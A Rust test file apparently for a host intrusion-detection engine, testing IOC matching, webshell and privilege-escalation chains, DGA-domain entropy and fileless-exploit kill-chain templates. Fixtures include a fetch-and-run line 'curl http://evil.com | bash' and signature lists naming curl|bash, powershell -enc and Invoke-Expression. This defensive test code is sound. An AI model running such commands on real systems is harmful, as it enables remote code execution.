use std::collections::HashMap;
use std::collections::VecDeque;

use crate::types::EVENT_CLASSES;
use crate::*;

fn event(ts: i64, class: EventClass, process: &str, parent: &str, uid: u32) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid: 100,
        ppid: 10,
        uid,
        process: process.to_string(),
        parent_process: parent.to_string(),
        session_id: 100,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

fn temporal_cap_rule(name: &str) -> TemporalRule {
    TemporalRule {
        name: name.to_string(),
        stages: vec![
            TemporalStage {
                predicate: TemporalPredicate {
                    event_class: EventClass::ProcessExec,
                    process_any_of: Some(std::iter::once("bash".to_string()).collect()),
                    parent_any_of: Some(std::iter::once("nginx".to_string()).collect()),
                    uid_eq: None,
                    uid_ne: None,
                    dst_port_not_in: None,
                    dst_port_any_of: None,
                    file_path_any_of: None,
                    file_path_contains: None,
                    command_line_contains: None,
                },
                within_secs: 30,
            },
            TemporalStage {
                predicate: TemporalPredicate {
                    event_class: EventClass::NetworkConnect,
                    process_any_of: None,
                    parent_any_of: None,
                    uid_eq: None,
                    uid_ne: None,
                    dst_port_not_in: Some(std::collections::HashSet::from([80, 443])),
                    dst_port_any_of: None,
                    file_path_any_of: None,
                    file_path_contains: None,
                    command_line_contains: None,
                },
                within_secs: 10,
            },
        ],
    }
}

#[test]
// AC-DET-201 AC-DET-202
fn cmdline_information_consistency_between_layers() {
    let cmd = "curl http://evil.com | bash";
    let data = cmd.as_bytes();
    let metrics = information::cmdline_information(data, 20).expect("metrics expected");
    let normalized = metrics.normalized();

    let event = TelemetryEvent {
        ts_unix: 1000,
        event_class: EventClass::ProcessExec,
        pid: 100,
        ppid: 1,
        uid: 0,
        process: "bash".to_string(),
        parent_process: "sshd".to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some(cmd.to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let signals = DetectionSignals {
        z1_exact_ioc: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };

    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
    assert!((features.values[14] - normalized.renyi_h2).abs() < 1e-12);
    assert!((features.values[15] - normalized.compression_ratio).abs() < 1e-12);
    assert!((features.values[16] - normalized.min_entropy).abs() < 1e-12);
    assert!((features.values[17] - normalized.entropy_gap).abs() < 1e-12);

    let mut behavior = behavioral::BehavioralEngine::new();
    let baseline_scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
    behavior.calibrate(baseline_scores, 0.05);
    for i in 0..(2 * 64) {
        let mut e = event.clone();
        e.ts_unix += i as i64;
        behavior.observe(&e);
    }
    let alarms = behavior.observe(&event);
    for alarm in alarms {
        if alarm.dimension == "cmdline_entropy" {
            assert!(alarm.current_entropy.is_some());
        }
    }
}

#[test]
fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
    let signals = DetectionSignals {
        z1_exact_ioc: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let mut event = TelemetryEvent {
        ts_unix: 1,
        event_class: EventClass::DnsQuery,
        pid: 123,
        ppid: 1,
        uid: 0,
        process: "curl".to_string(),
        parent_process: "cron".to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: Some(53),
        dst_ip: None,
        dst_domain: Some("x7f3a2b9d2c7f.dynamic-dns.net".to_string()),
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };
    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
    let entropy_high = features.values[18];
    assert!(
        entropy_high > 0.5,
        "expected high entropy for DGA-like domain"
    );

    event.dst_domain = Some("updates.example.org".to_string());
    let features2 = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
    let entropy_low = features2.values[18];
    assert!(
        entropy_low < entropy_high,
        "expected lower entropy for normal domain"
    );
}

#[test]
fn behavioral_dns_entropy_alarm_triggers_for_high_entropy_domains() {
    let mut engine = behavioral::BehavioralEngine::new();
    let mut event = TelemetryEvent {
        ts_unix: 1,
        event_class: EventClass::DnsQuery,
        pid: 4242,
        ppid: 1,
        uid: 0,
        process: "dns-test".to_string(),
        parent_process: "init".to_string(),
        session_id: 4242,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: Some(53),
        dst_ip: None,
        dst_domain: Some("x7f3a2b9d2c7f.dynamic-dns.net".to_string()),
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let mut alarm = None;
    for idx in 0..10 {
        event.ts_unix += idx as i64;
        for entry in engine.observe(&event) {
            if entry.dimension == "dns_entropy" {
                alarm = Some(entry);
                break;
            }
        }
        if alarm.is_some() {
            break;
        }
    }

    let alarm = alarm.expect("expected dns entropy alarm");
    let entropy = alarm.current_entropy.expect("expected entropy value");
    assert!(
        entropy > 0.7,
        "dns entropy should be high for DGA-like labels"
    );
}

#[test]
// AC-DET-060 AC-DET-061 AC-DET-062 AC-DET-063 AC-DET-064 AC-DET-065
fn confidence_ordering_matches_policy() {
    let base = DetectionSignals {
        z1_exact_ioc: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };

    let mut s = base.clone();
    s.z1_exact_ioc = true;
    assert_eq!(confidence_policy(&s), Confidence::Definite);

    let mut s = base.clone();
    s.z2_temporal = true;
    s.l1_prefilter_hit = true;
    assert_eq!(confidence_policy(&s), Confidence::VeryHigh);

    let mut s = base.clone();
    s.z2_temporal = true;
    assert_eq!(confidence_policy(&s), Confidence::High);

    let mut s = base.clone();
    s.z3_anomaly_high = true;
    assert_eq!(confidence_policy(&s), Confidence::Medium);

    let mut s = base;
    s.z3_anomaly_med = true;
    assert_eq!(confidence_policy(&s), Confidence::Low);
}

#[test]
// AC-DET-001 AC-DET-002 AC-DET-008 AC-DET-009
fn layer1_exact_verification_works() {
    let mut l1 = IocLayer1::new();
    l1.load_hashes(["abc".to_string()]);
    l1.load_domains(["bad.example".to_string()]);
    l1.load_ips(["1.2.3.4".to_string()]);
    l1.load_string_signatures(["curl|bash".to_string()]);

    assert_eq!(l1.check_hash("abc"), Layer1Result::ExactMatch);
    assert_eq!(l1.check_hash("ABC"), Layer1Result::ExactMatch);
    assert_eq!(l1.check_hash("nope"), Layer1Result::Clean);
    assert_eq!(l1.check_domain("BAD.EXAMPLE"), Layer1Result::ExactMatch);
    assert_eq!(l1.check_ip("1.2.3.4"), Layer1Result::ExactMatch);

    let mut ev = event(1, EventClass::ProcessExec, "bash", "sshd", 1000);
    ev.command_line = Some("curl|bash -s evil".to_string());
    let hit = l1.check_event(&ev);
    assert!(hit.matched_signatures.iter().any(|s| s == "curl|bash"));
}

#[test]
// AC-DET-003 AC-DET-085
fn layer1_loaded_entries_have_no_algorithmic_fn_and_unloaded_have_no_fp() {
    let mut l1 = IocLayer1::new();
    let mut loaded = Vec::new();
    for i in 0..256u32 {
        loaded.push(format!("hash-{i:08x}"));
    }
    l1.load_hashes(loaded.clone());

    for value in &loaded {
        assert_eq!(l1.check_hash(value), Layer1Result::ExactMatch);
    }

    for i in 0..256u32 {
        let unknown = format!("unknown-{i:08x}");
        assert_eq!(l1.check_hash(&unknown), Layer1Result::Clean);
    }
}

#[test]
// AC-DET-007
fn layer1_startup_self_check_validates_known_entries_across_prefilter_and_exact_store() {
    let mut l1 = IocLayer1::new();
    l1.load_hashes(["abc123".to_string(), "deadbeef".to_string()]);
    l1.load_domains(["c2.bad.example".to_string()]);
    l1.load_ips(["203.0.113.10".to_string()]);

    assert!(l1.self_check_hash_sample(["abc123".to_string(), "deadbeef".to_string()]));
    assert!(l1.self_check_domain_sample(["C2.BAD.EXAMPLE".to_string()]));
    assert!(l1.self_check_ip_sample(["203.0.113.10".to_string()]));

    assert!(!l1.self_check_hash_sample(["missing".to_string()]));
}

#[test]
fn layer1_append_string_signatures_preserves_existing_patterns() {
    let mut l1 = IocLayer1::new();
    l1.load_string_signatures(["curl|bash".to_string()]);
    l1.append_string_signatures(["python -c".to_string()]);

    let cmd = "curl|bash && python -c 'print(1)'";
    let matches = l1.check_text(cmd);
    assert!(matches.iter().any(|s| s == "curl|bash"));
    assert!(matches.iter().any(|s| s == "python -c"));
}

#[test]
// AC-DET-011
fn aho_matcher_space_scales_with_total_pattern_bytes() {
    let mut l1 = IocLayer1::new();
    let patterns = vec![
        "curl|bash".to_string(),
        "python -c".to_string(),
        "wget http://".to_string(),
        "powershell -enc".to_string(),
    ];
    let expected_bytes: usize = patterns.iter().map(|p| p.len()).sum();
    l1.load_string_signatures(patterns);

    assert_eq!(l1.debug_matcher_pattern_count(), 4);
    assert_eq!(l1.debug_matcher_pattern_bytes(), expected_bytes);
}

#[test]
#[cfg_attr(
    miri,
    ignore = "runtime envelope assertions are not meaningful under miri"
)]
// AC-DET-010
fn aho_matcher_scan_runtime_scales_approximately_linearly_with_input_bytes() {
    let mut l1 = IocLayer1::new();
    l1.load_string_signatures([
        "curl|bash".to_string(),
        "python -c".to_string(),
        "wget".to_string(),
        "Invoke-Expression".to_string(),
    ]);

    let small = "A".repeat(64 * 1024);
    let large = "A".repeat(256 * 1024);

    let started_small = std::time::Instant::now();
    for _ in 0..32 {
        std::hint::black_box(l1.check_text(&small));
    }
    let elapsed_small = started_small.elapsed().as_nanos() as f64;

    let started_large = std::time::Instant::now();
    for _ in 0..32 {
        std::hint::black_box(l1.check_text(&large));
    }
    let elapsed_large = started_large.elapsed().as_nanos() as f64;

    // 4x bytes should stay within a modest constant-factor envelope.
    let ratio = elapsed_large / elapsed_small.max(1.0);
    assert!(ratio < 10.0, "runtime ratio too high: {ratio}");
}

#[test]
// AC-DET-021 AC-DET-026 AC-DET-027 AC-DET-086
fn temporal_engine_detects_webshell_pattern() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(1, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 200;
    e1.session_id = 200;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(5, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 200;
    e2.session_id = 200;
    e2.dst_port = Some(8080);

    let hits = t.observe(&e2);
    assert!(hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-022
fn temporal_engine_detects_privilege_escalation_pattern() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(10, EventClass::ProcessExec, "bash", "sshd", 1000);
    e1.pid = 220;
    e1.session_id = 220;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(20, EventClass::ProcessExec, "su", "bash", 0);
    e2.pid = 220;
    e2.session_id = 220;
    let hits = t.observe(&e2);
    assert!(hits.iter().any(|h| h == "phi_priv_esc"));
}

#[test]
// AC-DET-024
fn temporal_engine_entity_isolation_prevents_cross_pid_matches() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(50, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 1001;
    e1.session_id = 1001;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(55, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 2002;
    e2.session_id = 2002;
    e2.dst_port = Some(8443);

    let hits = t.observe(&e2);
    assert!(hits.iter().all(|h| h != "phi_webshell"));
}

#[test]
// AC-DET-024 AC-DET-028 AC-DET-076
fn temporal_engine_pid_reuse_process_exec_clears_stale_pending_webshell_state() {
    let mut t = TemporalEngine::with_default_rules();

    let mut stage1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
    stage1.pid = 777;
    stage1.session_id = 777;
    assert!(t.observe(&stage1).is_empty());

    // Reused pid starts a different process image before the second stage arrives.
    let mut reused_exec = event(103, EventClass::ProcessExec, "python", "systemd", 1000);
    reused_exec.pid = 777;
    reused_exec.session_id = 777;
    assert!(t.observe(&reused_exec).is_empty());

    let mut stale_followup = event(106, EventClass::NetworkConnect, "python", "systemd", 1000);
    stale_followup.pid = 777;
    stale_followup.session_id = 777;
    stale_followup.dst_port = Some(9001);
    let stale_hits = t.observe(&stale_followup);
    assert!(stale_hits.iter().all(|h| h != "phi_webshell"));

    // A fresh matching chain on the same pid must still detect correctly.
    let mut fresh_stage1 = event(110, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 777;
    fresh_stage1.session_id = 777;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut fresh_stage2 = event(114, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 777;
    fresh_stage2.session_id = 777;
    fresh_stage2.dst_port = Some(9001);
    let fresh_hits = t.observe(&fresh_stage2);
    assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-024 AC-DET-028 AC-DET-076
fn temporal_engine_pid_reuse_without_exec_observation_does_not_continue_stale_chain() {
    let mut t = TemporalEngine::with_default_rules();

    let mut stage1 = event(600, EventClass::ProcessExec, "bash", "nginx", 33);
    stage1.pid = 889;
    stage1.session_id = 889;
    assert!(t.observe(&stage1).is_empty());

    // Simulate missing exec telemetry for a PID reuse: identity drift on non-process stage
    // must not continue stale pending stages.
    let mut stale_followup = event(605, EventClass::NetworkConnect, "python", "systemd", 1000);
    stale_followup.pid = 889;
    stale_followup.session_id = 889;
    stale_followup.dst_port = Some(9001);
    let stale_hits = t.observe(&stale_followup);
    assert!(stale_hits.iter().all(|h| h != "phi_webshell"));

    // A fresh in-order chain on the same PID must still detect correctly.
    let mut fresh_stage1 = event(610, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 889;
    fresh_stage1.session_id = 889;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut fresh_stage2 = event(614, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 889;
    fresh_stage2.session_id = 889;
    fresh_stage2.dst_port = Some(9001);
    let fresh_hits = t.observe(&fresh_stage2);
    assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
fn temporal_engine_process_exit_tears_down_state_and_metadata_immediately() {
    let mut t = TemporalEngine::with_default_rules();

    let mut stage1 = event(900, EventClass::ProcessExec, "bash", "nginx", 33);
    stage1.pid = 9_001;
    stage1.session_id = 9_001;
    assert!(t.observe(&stage1).is_empty());
    assert!(t.debug_state_count() > 0);
    assert!(t.debug_has_pid_metadata(9_001));

    let mut exit = event(901, EventClass::ProcessExit, "bash", "nginx", 33);
    exit.pid = 9_001;
    exit.session_id = 9_001;
    assert!(t.observe(&exit).is_empty());

    assert_eq!(t.debug_state_count(), 0);
    assert!(!t.debug_has_pid_metadata(9_001));

    let mut stale_followup = event(903, EventClass::NetworkConnect, "bash", "nginx", 33);
    stale_followup.pid = 9_001;
    stale_followup.session_id = 9_001;
    stale_followup.dst_port = Some(9001);
    let stale_hits = t.observe(&stale_followup);
    assert!(stale_hits.iter().all(|h| h != "phi_webshell"));

    let mut fresh_stage1 = event(905, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 9_001;
    fresh_stage1.session_id = 9_001;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut fresh_stage2 = event(908, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 9_001;
    fresh_stage2.session_id = 9_001;
    fresh_stage2.dst_port = Some(9001);
    let fresh_hits = t.observe(&fresh_stage2);
    assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
fn temporal_engine_process_exit_teardown_is_idempotent_and_ignores_stale_out_of_order_exit() {
    let mut t = TemporalEngine::with_default_rules();

    let mut stage1 = event(1_000, EventClass::ProcessExec, "bash", "nginx", 33);
    stage1.pid = 9_101;
    stage1.session_id = 9_101;
    assert!(t.observe(&stage1).is_empty());

    let mut first_exit = event(1_005, EventClass::ProcessExit, "bash", "nginx", 33);
    first_exit.pid = 9_101;
    first_exit.session_id = 9_101;
    assert!(t.observe(&first_exit).is_empty());

    let mut duplicate_exit = event(1_005, EventClass::ProcessExit, "bash", "nginx", 33);
    duplicate_exit.pid = 9_101;
    duplicate_exit.session_id = 9_101;
    assert!(t.observe(&duplicate_exit).is_empty());
    assert_eq!(t.debug_state_count(), 0);
    assert!(!t.debug_has_pid_metadata(9_101));

    let mut fresh_stage1 = event(1_010, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 9_101;
    fresh_stage1.session_id = 9_101;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut stale_exit = event(1_002, EventClass::ProcessExit, "bash", "nginx", 33);
    stale_exit.pid = 9_101;
    stale_exit.session_id = 9_101;
    assert!(t.observe(&stale_exit).is_empty());

    let mut fresh_stage2 = event(1_013, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 9_101;
    fresh_stage2.session_id = 9_101;
    fresh_stage2.dst_port = Some(9001);
    let hits = t.observe(&fresh_stage2);
    assert!(hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
fn temporal_engine_eviction_counters_track_retention_and_capacity_reasons() {
    let mut t = TemporalEngine::with_capacity_limits_for_test(1, 1);
    t.add_rule(temporal_cap_rule("counter_rule"));

    let mut first = event(2_000, EventClass::ProcessExec, "bash", "nginx", 33);
    first.pid = 9_201;
    first.session_id = 9_201;
    assert!(t.observe(&first).is_empty());

    let mut second = event(2_010, EventClass::ProcessExec, "bash", "nginx", 33);
    second.pid = 9_202;
    second.session_id = 9_202;
    assert!(t.observe(&second).is_empty());

    let counters_after_capacity = t.debug_eviction_counters();
    assert!(counters_after_capacity.state_cap_evict >= 1);
    assert!(counters_after_capacity.metadata_cap_evict >= 1);

    let mut horizon = event(3_000, EventClass::FileOpen, "python", "systemd", 1000);
    horizon.pid = 9_203;
    horizon.session_id = 9_203;
    let _ = t.observe(&horizon);

    let counters_after_retention = t.debug_eviction_counters();
    assert!(counters_after_retention.retention_prune >= 1);
}

#[test]
// AC-DET-024 AC-DET-119
fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon() {
    let mut t = TemporalEngine::with_default_rules();

    let mut stale_stage1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
    stale_stage1.pid = 990;
    stale_stage1.session_id = 990;
    assert!(t.observe(&stale_stage1).is_empty());
    assert!(t.debug_state_count() > 0);
    assert!(t.debug_has_pid_metadata(990));

    // Advance horizon well past temporal retention to force stale state/metadata pruning.
    let mut horizon_advance = event(500, EventClass::FileOpen, "python", "systemd", 1000);
    horizon_advance.pid = 991;
    horizon_advance.session_id = 991;
    let _ = t.observe(&horizon_advance);

    assert_eq!(t.debug_state_count(), 0);
    assert!(!t.debug_has_pid_metadata(990));
    assert_eq!(t.debug_pid_last_seen_count(), 1);
    assert_eq!(t.debug_pid_exec_epoch_count(), 1);

    // Stale follow-up must not trigger on the old pending chain.
    let mut stale_followup = event(505, EventClass::NetworkConnect, "bash", "nginx", 33);
    stale_followup.pid = 990;
    stale_followup.session_id = 990;
    stale_followup.dst_port = Some(9001);
    let stale_hits = t.observe(&stale_followup);
    assert!(stale_hits.iter().all(|h| h != "phi_webshell"));

    // Fresh chain on reused pid must still detect.
    let mut fresh_stage1 = event(510, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 990;
    fresh_stage1.session_id = 990;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut fresh_stage2 = event(513, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 990;
    fresh_stage2.session_id = 990;
    fresh_stage2.dst_port = Some(9001);
    let fresh_hits = t.observe(&fresh_stage2);
    assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-024 AC-DET-119
fn temporal_engine_state_capacity_evicts_oldest_pending_chain_deterministically() {
    let mut t = TemporalEngine::with_capacity_limits_for_test(1, 128);
    t.add_rule(temporal_cap_rule("cap_rule"));

    let mut oldest_stage1 = event(700, EventClass::ProcessExec, "bash", "nginx", 33);
    oldest_stage1.pid = 5_001;
    oldest_stage1.session_id = 5_001;
    assert!(t.observe(&oldest_stage1).is_empty());

    let mut newest_stage1 = event(705, EventClass::ProcessExec, "bash", "nginx", 33);
    newest_stage1.pid = 5_002;
    newest_stage1.session_id = 5_002;
    assert!(t.observe(&newest_stage1).is_empty());

    assert_eq!(t.debug_state_count(), 1);

    // Oldest pending stage should have been evicted by capacity pressure.
    let mut evicted_followup = event(709, EventClass::NetworkConnect, "bash", "nginx", 33);
    evicted_followup.pid = 5_001;
    evicted_followup.session_id = 5_001;
    evicted_followup.dst_port = Some(9001);
    let evicted_hits = t.observe(&evicted_followup);
    assert!(evicted_hits.iter().all(|h| h != "cap_rule"));

    // Newest pending stage remains valid and should detect.
    let mut retained_followup = event(710, EventClass::NetworkConnect, "bash", "nginx", 33);
    retained_followup.pid = 5_002;
    retained_followup.session_id = 5_002;
    retained_followup.dst_port = Some(9001);
    let retained_hits = t.observe(&retained_followup);
    assert!(retained_hits.iter().any(|h| h == "cap_rule"));
}

#[test]
// AC-DET-024 AC-DET-119
fn temporal_engine_pid_metadata_capacity_evicts_oldest_then_tie_breaks_by_pid() {
    let mut oldest = TemporalEngine::with_capacity_limits_for_test(64, 2);

    let mut pid1 = event(800, EventClass::ProcessExec, "python", "systemd", 0);
    pid1.pid = 6_001;
    pid1.session_id = 6_001;
    assert!(oldest.observe(&pid1).is_empty());

    let mut pid2 = event(805, EventClass::ProcessExec, "python", "systemd", 0);
    pid2.pid = 6_002;
    pid2.session_id = 6_002;
    assert!(oldest.observe(&pid2).is_empty());

    let mut pid3 = event(810, EventClass::ProcessExec, "python", "systemd", 0);
    pid3.pid = 6_003;
    pid3.session_id = 6_003;
    assert!(oldest.observe(&pid3).is_empty());

    assert!(!oldest.debug_has_pid_metadata(6_001));
    assert!(oldest.debug_has_pid_metadata(6_002));
    assert!(oldest.debug_has_pid_metadata(6_003));
    assert_eq!(oldest.debug_pid_exec_epoch_count(), 2);
    assert_eq!(oldest.debug_pid_last_seen_count(), 2);

    let mut tie = TemporalEngine::with_capacity_limits_for_test(64, 1);

    let mut tie_low_pid = event(900, EventClass::ProcessExec, "python", "systemd", 0);
    tie_low_pid.pid = 7_001;
    tie_low_pid.session_id = 7_001;
    assert!(tie.observe(&tie_low_pid).is_empty());

    let mut tie_high_pid = event(900, EventClass::ProcessExec, "python", "systemd", 0);
    tie_high_pid.pid = 7_002;
    tie_high_pid.session_id = 7_002;
    assert!(tie.observe(&tie_high_pid).is_empty());

    assert!(!tie.debug_has_pid_metadata(7_001));
    assert!(tie.debug_has_pid_metadata(7_002));
}

#[test]
// AC-DET-028 AC-DET-076
fn temporal_engine_rejects_stage_restart_from_timestamp_skew_beyond_tolerance() {
    let mut t = TemporalEngine::with_default_rules();

    let mut first = event(500, EventClass::ProcessExec, "bash", "nginx", 33);
    first.pid = 888;
    first.session_id = 888;
    assert!(t.observe(&first).is_empty());

    // Out-of-order process_exec beyond reorder tolerance must be ignored.
    let mut skewed_restart = event(450, EventClass::ProcessExec, "bash", "nginx", 33);
    skewed_restart.pid = 888;
    skewed_restart.session_id = 888;
    assert!(t.observe(&skewed_restart).is_empty());

    let mut skewed_followup = event(455, EventClass::NetworkConnect, "bash", "nginx", 33);
    skewed_followup.pid = 888;
    skewed_followup.session_id = 888;
    skewed_followup.dst_port = Some(9001);
    let skewed_hits = t.observe(&skewed_followup);
    assert!(skewed_hits.iter().all(|h| h != "phi_webshell"));

    // Fresh in-order chain on same pid must still detect correctly.
    let mut fresh_stage1 = event(506, EventClass::ProcessExec, "bash", "nginx", 33);
    fresh_stage1.pid = 888;
    fresh_stage1.session_id = 888;
    assert!(t.observe(&fresh_stage1).is_empty());

    let mut fresh_stage2 = event(509, EventClass::NetworkConnect, "bash", "nginx", 33);
    fresh_stage2.pid = 888;
    fresh_stage2.session_id = 888;
    fresh_stage2.dst_port = Some(9001);
    let fresh_hits = t.observe(&fresh_stage2);
    assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-028 AC-DET-076
fn temporal_engine_rejects_reorder_beyond_tolerance() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(200, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 303;
    e1.session_id = 303;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(197, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 303;
    e2.session_id = 303;
    e2.dst_port = Some(9001);

    let hits = t.observe(&e2);
    assert!(hits.iter().all(|h| h != "phi_webshell"));
}

#[test]
// AC-DET-030 AC-DET-034
fn anomaly_engine_flags_distribution_shift() {
    let mut a = AnomalyEngine::default();
    let mut baseline = HashMap::new();
    baseline.insert(EventClass::ProcessExec, 0.9);
    baseline.insert(EventClass::NetworkConnect, 0.1);
    a.set_baseline("bash:sshd".to_string(), baseline);

    for i in 0..128 {
        let mut e = event(i, EventClass::NetworkConnect, "bash", "sshd", 1000);
        e.dst_port = Some(4444);
        let out = a.observe(&e);
        if i == 127 {
            let decision = out.expect("decision");
            assert!(decision.high || decision.medium);
        }
    }
}

#[test]
// AC-DET-050 AC-DET-051 AC-DET-088
fn layer4_matches_default_template() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
    parent.pid = 10;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
    child.pid = 11;
    child.ppid = 10;
    child.session_id = child.pid;
    let _ = l4.observe(&child);

    let mut net = event(4, EventClass::NetworkConnect, "bash", "nginx", 33);
    net.pid = 11;
    net.ppid = 10;
    net.session_id = net.pid;
    net.dst_port = Some(9001);
    let hits = l4.observe(&net);
    assert!(hits.iter().any(|h| h == "killchain_webshell_network"));
}

#[test]
// AC-DET-236
fn layer4_ptrace_fileless_chain_triggers() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::ProcessExec, "gdb", "systemd", 1000);
    parent.pid = 200;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    parent.command_line = Some("gdb --pid 4242 --eval-command=ptrace".to_string());
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "bash", "gdb", 1000);
    child.pid = 201;
    child.ppid = 200;
    child.session_id = child.pid;
    child.file_path = Some("memfd:payload (deleted)".to_string());
    let hits = l4.observe(&child);
    assert!(hits
        .iter()
        .any(|h| h == "killchain_exploit_ptrace_fileless"));
}

#[test]
// AC-DET-237
fn layer4_userfaultfd_execveat_chain_triggers() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::ProcessExec, "python", "systemd", 1000);
    parent.pid = 300;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    parent.command_line = Some("python userfaultfd_poc.py".to_string());
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "payload", "python", 1000);
    child.pid = 301;
    child.ppid = 300;
    child.session_id = child.pid;
    child.command_line = Some("execveat /proc/self/fd/7".to_string());
    let hits = l4.observe(&child);
    assert!(hits
        .iter()
        .any(|h| h == "killchain_exploit_userfaultfd_execveat"));
}

#[test]
// AC-DET-238
fn layer4_proc_mem_fileless_chain_triggers() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::FileOpen, "bash", "systemd", 1000);
    parent.pid = 400;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    parent.file_path = Some("/proc/4242/mem".to_string());
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "bash", "bash", 1000);
    child.pid = 401;
    child.ppid = 400;
    child.session_id = child.pid;
    child.file_path = Some("memfd:stage (deleted)".to_string());
    let hits = l4.observe(&child);
    assert!(hits
        .iter()
        .any(|h| h == "killchain_exploit_proc_mem_fileless"));
}

#[test]
// AC-DET-050 AC-DET-088
fn layer4_hit_is_scoped_to_current_event_lineage_and_does_not_replay_on_unrelated_events() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
    parent.pid = 50;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
    child.pid = 51;
    child.ppid = 50;
    child.session_id = child.pid;
    let _ = l4.observe(&child);

    let mut trigger = event(3, EventClass::NetworkConnect, "bash", "nginx", 33);
    trigger.pid = 51;
    trigger.ppid = 50;
    trigger.session_id = trigger.pid;
    trigger.dst_port = Some(9001);
    let hits = l4.observe(&trigger);
    assert!(hits.iter().any(|h| h == "killchain_webshell_network"));

    let mut unrelated = event(4, EventClass::ProcessExec, "cron", "systemd", 1000);
    unrelated.pid = 99;
    unrelated.ppid = 1;
    unrelated.session_id = unrelated.pid;
    let unrelated_hits = l4.observe(&unrelated);
    assert!(
        unrelated_hits
            .iter()
            .all(|h| h != "killchain_webshell_network"),
        "stale kill-chain hit leaked into unrelated event context"
    );
}

#[test]
